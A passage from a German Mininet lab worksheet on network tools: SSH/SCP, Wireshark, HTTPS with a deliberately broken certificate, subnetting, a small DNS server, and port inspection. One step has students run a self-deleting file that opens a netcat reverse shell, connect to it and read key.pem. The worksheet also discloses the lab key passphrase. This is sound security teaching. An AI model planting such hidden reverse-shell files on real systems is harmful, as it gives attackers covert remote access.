        versehentlich eingecheckten Backdoor ein und ersetzte den Inhalt durch
        harmlosen Fülltext – das war ein Fehler und wurde zurückgenommen. Es
        handelt sich um eine **bewusst designte Sicherheitslektion**:
        Verschlüsselung der Übertragung (SCP/SSH) schützt nur den
        Transportweg, nicht die Vertrauensentscheidung über den Inhalt am
        Endpunkt.

    Beobachtet in Wireshark den TCP-Drei-Wege-Handshake, die
    SSH-Verhandlungsphase und danach durchgehend verschlüsselten Verkehr –
    der Dateiinhalt selbst ist nicht einsehbar. Schaut euch die kopierte
    Datei lokal an:

    ```bash
    cat test30M.txt
    ```

    Darin findet sich ein netcat-Aufruf. Führt ihn probeweise aus, um eine
    (in dieser isolierten Übung harmlose) Reverse-Shell zu demonstrieren:

    ```bash
    sh ./test30M.txt
    ```

    Nach der Ausführung ist die Datei gelöscht und scheinbar nichts
    Wesentliches geschehen. Tatsächlich hat sich aber eine Reverse-Shell
    geöffnet. Verbindet euch von `h1` aus auf die geöffnete Shell und prüft,
    auf welchem Host ihr tatsächlich Befehle ausführt:

    ```bash
    netcat 10.0.6.2 1234
    ifconfig
    ```

    Erscheint ein Interface `h2-eth0`, habt ihr Zugriff auf `h2` – obwohl ihr
    den Befehl von `h1` aus abgesetzt habt. Aktiviert die Wireshark-Aufnahme
    auf `h2-eth0` erneut und schaut euch über die Reverse-Shell eine weitere
    Datei an:

    ```bash
    cat key.pem
    ```

    Über "Follow → TCP Stream" lässt sich die komplette, unverschlüsselte
    Kommunikation in Wireshark rekonstruieren – anders als bei SCP/SSH war
    dieser Kanal zu keinem Zeitpunkt verschlüsselt. Reflektiert Vor- und
    Nachteile aus Sicht von Nutzer:in, Administrator:in und
    Sicherheitsbehörden.

    Prüft abschließend auf `h2`, welche Prozesse Netzwerkports geöffnet
    halten, und beendet nicht erkannte Prozesse:

    ```bash
    netstat -tulnp
    kill -9 <PID>
    ```

10. **Verschlüsselter Web-Verkehr und ein absichtlich kaputtes
    Zertifikat.** Startet auf `h1` einen einfachen HTTP-Server:

    ```bash
    python3 startHTTPServer.py &
    ```

    Prüft mit `netstat`, dass Port 80 nun belegt ist. Startet auf `h2`
    Wireshark (Interface `h2-eth0`) und setzt den Anzeigefilter:

    ```text
    ip.addr == 10.0.1.2 && tcp
    ```

    Startet den Browser auf `h2`:

    ```bash
    ./runSimpleBrowser.sh
    ```

    und ruft `http://h1` auf. Vergleicht in Wireshark ("Follow → TCP
    Stream") den HTTP/HTML-Inhalt mit der im Browser sichtbaren Seite bzw.
    mit "View Page Source".

    Beendet den HTTP-Server auf `h1` (++ctrl+c++) und startet stattdessen den
    HTTPS-Server:

    ```bash
    python3 startHTTPsServer.py
    ```

    Ruft auf `h2` `https://h1` auf und beobachtet erneut in Wireshark, dass
    der Inhalt diesmal nicht mehr im Klartext sichtbar ist.

    !!! warning "Absichtlich fehlerhaftes Zertifikat"
        Der Browser wird eine Zertifikatswarnung anzeigen. Das ist
        **beabsichtigt**: `cert.pem`/`key.pem` in `topo01` sind ein
        absichtlich unsinniges, selbstsigniertes Test-Zertifikat
        (`CN=noway`, Organisation "Not your buisness", Abteilung
        "bad company") – kein Konfigurationsfehler der Umgebung. Das
        eigentliche Lernziel dieses Schritts ist, als Nutzer:in *ohne*
        IT-Hintergrund zu erkennen und zu benennen, was an diesem Zertifikat
        nicht stimmt (z. B. unpassender/unbekannter Aussteller, Common Name
        ohne Bezug zum aufgerufenen Namen `h1`).

    !!! note "Playwright-Screenshot-Referenz"
        Für den Beleg der `dig`/`nmap`-Ausgaben bzw. der Zertifikatswarnung
        im Browser eignet sich dagegen ein **Zeilen-/Locator-Screenshot**
        (siehe `tests/e2e/specs/screenshots.spec.ts`, Test "Zeilen-Screenshot")
        besser als ein Fenster-Screenshot: es geht um den Inhalt einer
        konkreten Ausgabezeile bzw. eines Warnhinweis-Elements, nicht um den
        gesamten sichtbaren Fensterzustand.

11. **Netz beenden.** Auf der Mininet-Konsole:

    ```text
    mininet> quit
    ```

!!! tip "Fortschritt festhalten (optional)"
    Diesen Teil geschafft? Optional fuer die Admin-Uebersicht vermerken
    (rein lokal, keine Netzwerkverbindung):

    ```bash
    ~/rn-practice/mark-done.sh 01 teil2
    ```

!!! example "Vertiefung (optional): TLS-ClientHello von curl und Firefox vergleichen"
    Schritt 10 hat gezeigt, dass der Browser bei einem fehlerhaften
    Zertifikat warnt. Geht einen Schritt tiefer und vergleicht, *wie*
    unterschiedliche Clients überhaupt eine TLS-Verbindung anbahnen:
    Startet auf `h1` erneut `python3 startHTTPsServer.py` und auf `h2`
    eine Wireshark-Aufzeichnung auf `h2-eth0`. Ruft `https://h1` einmal
    mit `curl -k https://h1` und einmal über `./runSimpleBrowser.sh` auf.
    Filtert in Wireshark auf `tls.handshake.type == 1` (Client Hello) und
    vergleicht bei beiden Mitschnitten die angebotene Liste der
    Cipher-Suiten sowie die TLS-Erweiterungen. Diese Unterschiede sind kein
    Zufall, sondern der Fingerabdruck der jeweiligen TLS-Bibliothek – genau
    das Prinzip, auf dem Verfahren wie JA3-Fingerprinting beruhen (siehe
    [Aufgabenblatt 06, Teil 5](06-advanced-covert-channels.md)).


### Teil 3 – Subnetz-Zugehörigkeit selbst berechnen, bevor ihr sie prüft (`topo01`)

Aufgabe 2 in Teil 2 hat euch bereits auffallen lassen, dass ein Ping von `h1`
zu `h2` nicht direkt funktioniert, während Pings zu anderen Zielen sehr wohl
ankommen. Statt das nur zu beobachten, berechnet jetzt selbst, *warum* das so
ist – bevor ihr es mit einem Befehl nachprüft.

`topo01` vergibt euch bereits bekannte Adressen: `h1` hat **zwei** Interfaces,
`h1-eth0` mit `10.0.5.2/24` und `h1-eth1` mit `10.0.1.2/24`; `h2` hat ein
Interface `h2-eth0` mit `10.0.6.2/24`.

Bestimmt für jedes der folgenden Ziele – **auf Papier oder im Kopf, ohne
vorher `ip route` oder Ähnliches auszuführen** – ob es im selben Subnetz wie
der jeweilige Startpunkt liegt (Netzwerk- und Broadcast-Adresse aus der
`/24`-Maske berechnen genügt) oder ob eine Weiterleitung über einen Router
nötig ist:

| Startpunkt | Ziel | Gleiches Subnetz? | Begründung |
|---|---|---|---|
| `h1` (`10.0.5.2/24` auf `h1-eth0`) | `10.0.6.2` (`h2`) | ? | ? |
| `h1` (`10.0.5.2/24` auf `h1-eth0`) | `10.0.5.1` | ? | ? |
| `h1` (`10.0.1.2/24` auf `h1-eth1`) | `1.1.1.1` | ? | ? |
| `h2` (`10.0.6.2/24` auf `h2-eth0`) | `10.0.1.1` | ? | ? |

Prüft anschließend jede Zeile eurer Tabelle mit dem tatsächlichen
Weiterleitungsentscheid des Kernels – `ip route get` beantwortet euch pro
Ziel genau die Frage, die ihr gerade von Hand beantwortet habt:

```bash
h1$ ip route get 10.0.6.2
h1$ ip route get 10.0.5.1
h1$ ip route get 1.1.1.1
h2$ ip route get 10.0.1.1
```

**So lest ihr die Ausgabe:** Steht in der Zeile ein `via <IP>` vor dem
`dev <interface>`, wird das Paket über einen Router (die angegebene
Gateway-Adresse) weitergeleitet – das Ziel liegt in einem anderen Subnetz.
Fehlt `via` und steht nur `dev <interface>` da, ist das Ziel direkt über
dieses Interface erreichbar (gleiches Subnetz, Auflösung per ARP statt per
Routing).

!!! success "Real geprüft"
    Auf einem frisch gestarteten Container liefert `topo01` genau das aus
    der Adressierung berechenbare Bild: `ip route get 10.0.6.2` auf `h1`
    zeigt `via 10.0.1.1 dev h1-eth1` (anderes Subnetz, Route über `r1`),
    `ip route get 10.0.5.1` auf `h1` zeigt dagegen nur `dev h1-eth0` ohne
    `via` (`10.0.5.1` liegt im selben `/24` wie `h1-eth0`), ein Ziel
    außerhalb aller lokalen `/24`-Netze — geprüft mit einer öffentlichen
    Adresse — geht über die Default-Route `via 10.0.5.1 dev h1-eth0`
    (Internet-Ziel über den NAT-Uplink), und `ip route get 10.0.1.1` auf
    `h2` zeigt `via 10.0.6.1 dev h2-eth0`.

**Aufgabe:** Erklärt anhand eurer Tabelle, warum ein direkter Ping zwischen
`h1` und `h2` fehlschlägt bzw. Paketverlust zeigt (siehe die Warnung weiter
oben), obwohl beide Rechner Teil derselben Topologie sind – und warum das
kein Fehler, sondern eine direkte Folge der Subnetz-Struktur ist.

!!! tip "Fortschritt festhalten (optional)"
    Diesen Teil geschafft? Optional fuer die Admin-Uebersicht vermerken
    (rein lokal, keine Netzwerkverbindung):

    ```bash
    ~/rn-practice/mark-done.sh 01 teil3
    ```


--8<-- "issue-feedback.md"

### Teil 4 – Namensauflösung selbst betreiben: ein lesbarer DNS-Server (`topo01`)

In Teil 2 habt ihr `dig` benutzt, um Namen aufzulösen – und dabei einen
DNS-Dienst auf `h1` als gegeben hingenommen. In diesem Teil betreibt ihr die
Namensauflösung selbst und seht, **wie** eine DNS-Antwort aufgebaut ist.

!!! note "Warum ein eigener DNS-Server statt `dnsmasq`"
    Das Kurs-Image bringt keinen fertigen DNS-Server mit (`dnsmasq`, `bind9`,
    `unbound` und `coredns` sind alle nicht installiert – real geprüft
    2026-09-25). Statt einen Dienst mit einer Konfigurationsdatei zu
    verstecken, liegt im Topologie-Verzeichnis ein **lesbares Python-Skript**,
    `dns-server.py`, das nur die Standardbibliothek benutzt (`socketserver`
    und `struct`). Ihr seht daran, wie eine DNS-Antwort **Byte für Byte**
    entsteht – das ist mehr wert als eine fertige Konfiguration.

Startet `topo01`, öffnet ein Terminal für `h1` und werft zuerst einen Blick in
das Skript:

```bash
h1$ cd ~/rn-practice/topo01
h1$ cat dns-server.py
```

Achtet auf die Funktion `encode_name` (ein Label = ein Längen-Byte plus die
Zeichen, abgeschlossen mit einem Null-Byte) und auf den Header mit seinen
Flags (`QR`, `AA`). Startet den Server (Port 53 braucht Root-Rechte – im
Knoten-Fenster von `h1` seid ihr bereits root):

```bash
h1$ python3 dns-server.py
```

Fragt den Server von `h2` aus mit allen drei Standard-Werkzeugen ab:

```bash
h2$ dig @10.0.1.2 h2
h2$ nslookup h1 10.0.1.2
h2$ host becke.net 10.0.1.2
```

Fragt zuletzt einen Namen ab, den der Server **nicht** kennt, und schaut euch
den Statuscode an:

```bash
h2$ dig @10.0.1.2 gibtsnicht.invalid +noall +comments
```

**Aufgabe:** In der `dig`-Ausgabe stehen die Flags `qr aa`. Was bedeuten sie
(Antwort? autoritativ?), und wo im Skript werden sie gesetzt? Welchen
`status`-Wert liefert die letzte, unbekannte Abfrage, und welche Zeile im
Skript entscheidet darüber?

!!! success "Real geprüft (2026-09-25)"
    Gegen den laufenden `dns-server.py` lieferte `dig @10.0.1.2 h2` die Antwort
    `10.0.6.2` mit den Flags `qr aa` und `ANSWER: 1`; `nslookup` und `host`
    lösten `h1` bzw. `becke.net` ebenso auf. Die unbekannte Abfrage
    `gibtsnicht.invalid` lieferte `status: NXDOMAIN` mit `ANSWER: 0` – genau
    die Fallunterscheidung aus der Zeile `rcode = 0 if (ip or qtype != 1) else 3`.

!!! quote "Fun Fact (belegt): DNS ist kaum jünger als das Internet-Protokoll selbst"
    Paul Mockapetris entwarf das DNS 1983 am Information Sciences Institute der
    USC, weil die zentrale Datei `HOSTS.TXT` nicht mehr skalierte. Die
    Erstfassung steht in RFC 882 und RFC 883 (November 1983); vier Jahre später
    ersetzten RFC 1034 und RFC 1035 sie – deren Kopf lautet „Obsoletes: RFCs
    882, 883, **973**" (also drei Dokumente, nicht zwei). Der kleine Server,
    den ihr hier startet, tut im Kern dasselbe wie diese 40 Jahre alte Idee:
    einen Namen in eine Adresse übersetzen.

    - RFC 1035 (Kopf „Obsoletes: RFCs 882, 883, 973") (rfc-editor): <https://www.rfc-editor.org/rfc/rfc1035.html> (Abruf 2026-09-25)
    - Internet Hall of Fame, Paul Mockapetris („invented the Domain Name System (DNS) in 1983"): <https://www.internethalloffame.org/inductee/paul-mockapetris/> (Abruf 2026-09-25)

!!! tip "Fortschritt festhalten (optional)"
    Diesen Teil geschafft? Optional fuer die Admin-Uebersicht vermerken
    (rein lokal, keine Netzwerkverbindung):

    ```bash
    ~/rn-practice/mark-done.sh 01 teil4
    ```


### Teil 5 – Offene Ports finden: `ss` statt `netstat` (`topo01`)

In Teil 2 (Aufgabe 9) habt ihr `netstat -tulnp` benutzt. `netstat` gilt heute
als veraltet und wird von vielen Distributionen nicht mehr standardmäßig
installiert; sein Nachfolger aus dem `iproute2`-Paket ist **`ss`**. In diesem
Teil öffnet ihr selbst einen Dienst und findet ihn wieder.

Öffnet auf `h1` mit `socat` einen einfachen TCP-Echo-Dienst auf Port 8080 –
`socat` (*SOcket CAT*) ist das vielseitigere Geschwister von `netcat` und im
Image vorhanden:

```bash
h1$ socat TCP-LISTEN:8080,reuseaddr,fork EXEC:/bin/cat &
```

Findet den lauschenden Port einmal mit `ss` und einmal mit `netstat` und
vergleicht die Ausgaben:

```bash
h1$ ss -tlnp
h1$ ss -tlnp 'sport = :8080'
h1$ netstat -tlnp 2>/dev/null | grep 8080 || echo "netstat nicht verfuegbar"
```

**Aufgabe:** Welche Spalten zeigt `ss` (Zustand, lokale Adresse:Port,
Prozess)? Was bedeutet `LISTEN`? Beendet den Dienst danach wieder
(`kill %1` oder `pkill socat`) und prüft mit `ss -tlnp`, dass der Port
verschwunden ist.

!!! success "Real geprüft (2026-09-25)"
    Nach dem Start des `socat`-Listeners zeigte `ss -tlnp` einen Eintrag im
    Zustand `LISTEN` auf `0.0.0.0:8080`; die Filterform `ss -tlnp 'sport =
    :8080'` grenzte genau auf diesen Port ein. Nach `pkill socat` war der
    Eintrag weg.

!!! tip "Fortschritt festhalten (optional)"
    Diesen Teil geschafft? Optional fuer die Admin-Uebersicht vermerken
    (rein lokal, keine Netzwerkverbindung):

    ```bash
    ~/rn-practice/mark-done.sh 01 teil5
    ```


### Teil 6 – Eine Verbindung von Hand aufbauen und ihren Klartext sehen (`topo01`)

!!! quote "Fun Fact (belegt): das „TCP/IP swiss army knife" und sein anonymer Autor"
    `netcat` wurde 1995 von einem Autor veröffentlicht, der nur unter dem
    Pseudonym „Hobbit" auftritt. Die letzte Originalfassung trägt die
    Release-Zeile „v1.10 RELEASE" vom 20. März 1996 – ganz ohne
    Lizenz-Formalitäten: „No GPLs, Berkeley copyrights or any of that
    nonsense." Den Spitznamen hat Hobbit selbst geprägt: er nennt das Werkzeug
    „my tcp/ip swiss army knife". `socat`, das ihr hier benutzt, ist der
    vielseitigere Nachfahre derselben Idee. (Ein RFC existiert dazu nicht –
    netcat ist ein Werkzeug, kein Protokoll.)

    - Original-README/Release-Notizen von „Hobbit" (nc110): <https://nc110.sourceforge.io/> (Abruf 2026-09-25)
    - SecTools.org (Nmap-Projekt), Eintrag Netcat („released by Hobbit in 1995"): <https://sectools.org/tool/netcat/> (Abruf 2026-09-25)

Teil 2 (Aufgabe 4) hat euch mit `netcat` schon einen UDP-Listener sprechen
lassen. Hier baut ihr eine **TCP**-Verbindung zwischen den beiden Hosts auf
und weist nach, dass ihr Inhalt vollständig im Klartext über die Leitung geht
– im direkten Kontrast zur SSH-Verbindung aus Aufgabe 9.

Der Echo-Dienst aus Teil 5 läuft noch auf `h1` (sonst neu starten). Startet auf
`h1` einen Mitschnitt und schickt von `h2` eine Zeile durch:

```bash
h1$ sudo tcpdump -i h1-eth0 -A -w /tmp/klartext.pcap tcp port 8080 &
h2$ printf 'GEHEIM: passwort123\n' | socat -T2 - TCP:10.0.1.2:8080
```

Der Echo-Dienst schickt euch dieselbe Zeile zurück – ihr habt also eine
funktionierende Zwei-Wege-Verbindung. Beendet den Mitschnitt auf `h1`
(`sudo pkill tcpdump`) und sucht euren Text darin:

```bash
h1$ tcpdump -r /tmp/klartext.pcap -A | grep GEHEIM
```

**Aufgabe:** Der Text `GEHEIM: passwort123` steht unverschlüsselt im
Mitschnitt. Vergleicht das mit dem SCP/SSH-Verkehr aus Aufgabe 9 (Teil 2):
Warum ist dort der Inhalt **nicht** lesbar, hier aber schon? Was bedeutet das
für Anwendungsprotokolle, die – wie klassisches HTTP, Telnet oder FTP – ohne
Transportverschlüsselung arbeiten?

!!! success "Real geprüft (2026-09-25)"
    Die von `h2` gesendete Zeile `GEHEIM: passwort123` kam über den
    Echo-Dienst zurück **und** war anschließend im Mitschnitt auf `h1` per
    `tcpdump -A` im Klartext lesbar – während der SSH-Verkehr aus Aufgabe 9
    verschlüsselt bleibt.

!!! tip "Fortschritt festhalten (optional)"
    Diesen Teil geschafft? Optional fuer die Admin-Uebersicht vermerken
    (rein lokal, keine Netzwerkverbindung):

    ```bash
    ~/rn-practice/mark-done.sh 01 teil6
    ```


--8<-- "issue-feedback.md"

## Potenzielle Herausforderungen

- **`getIntWithIntenet.sh` muss vor `topo01.py` laufen.** `topo01.py` liest
  beim Start eine Datei `interface.txt` ein, die Interface-Name und
  Gateway-Adresse für den NAT-Uplink enthält. Diese Datei wird von
  `getIntWithIntenet.sh` erzeugt. Wer `topo01.py` direkt aufruft (statt über
  `./start-topo01.sh`, das beide Schritte in der richtigen Reihenfolge
  ausführt), bekommt einen `FileNotFoundError` ohne hilfreiche
  Fehlermeldung, die auf die eigentliche Ursache hinweist.
- **`cert.pem`/`key.pem` sind absichtlich fehlerhaft.** Das Zertifikat trägt
  `CN=noway` und offensichtlich unsinnige Organisationsangaben. Das ist kein
  Bug, sondern das Lernziel von Aufgabe 10: einen Zertifikatsfehler als
  Laie erkennen und einordnen können.
- **`key.pem` ist passphrasengeschützt – bisher nirgends dokumentiert.** Real
  geprüft (2026-09-09): `python3 startHTTPsServer.py` fragt beim Laden von
  `key.pem` interaktiv nach einer PEM-Passphrase, bevor der Server überhaupt
  auf Port 443 lauscht (`openssl rsa -in key.pem -check` bestätigt dieselbe
  Abfrage direkt). Die Passphrase ist **`mininet`** (durch Ausprobieren
  verifiziert, `openssl rsa ... -passin pass:mininet` liefert `RSA key ok`).
  Ohne dieses Wissen bleibt Aufgabe 10 an dieser Stelle stecken. Siehe auch
  [Aufgabenblatt 07, Teil 3](07-http-rest-quic.md), das denselben Server
  nutzt und dort ebenfalls auf die Passphrase hinweist.
- **`h1` ↔ `h2` direkt: kein Ping möglich.** Die Topologie verbindet `h1`
  und `h2` nur indirekt über die Router `r1`/`r2` mit asymmetrischem
  Routing zwischen den beiden Subnetzen. Ein `pingall` in dieser Topologie
  zeigt planmäßig Paketverlust zwischen `h1` und `h2` – das ist Teil der
  Lernaufgabe (Frage 2 in diesem Aufgabenblatt), nicht ein Defekt der
  Umgebung oder des Environments. Das Verhalten ist auf einem echten
  Container nachgestellt und bestätigt worden.
- **Uneinheitliche Pfadangaben im Original.** Das Originaldokument mischt
  `~/rn-practice/topo01`, `/home/mininet/rn-practice/topo01` und
  `/headless/rn-practice/...`. In diesem Aufgabenblatt wird durchgehend
  `~/rn-practice/topo01` verwendet, der tatsächlich verifizierte Pfad in
  dieser Umgebung.
- **`mininet> xterm <node>` funktioniert weiterhin, ist aber technisch ein
  Shim.** Der Befehl bleibt für euch unverändert nutzbar, öffnet im
  Hintergrund aber `xfce4-terminal` statt eines echten `xterm`-Programms.
  Das ist für die Aufgaben irrelevant, kann aber verwirren, wenn ihr euch
  wundert, warum das geöffnete Fenster nicht wie ein klassisches
  X11-`xterm` aussieht.

## Quellen

- `mininet-labs/intro/01-Basis-Netzwerktools.tex`
- `mininet-labs/vertiefung/Labor-01-Schichtenmodelle.tex`
- `mininet-labs/rn-practice/topo01/`
- `mininet-labs/rn-practice/topo01/dns-server.py` – der lesbare
  Python-DNS-Server (Teil 4), neu für diese Konsolidierung erstellt, weil das
  Image keinen DNS-Server mitbringt; gegen `dig`/`nslookup`/`host` in der
  echten Topologie geprüft.
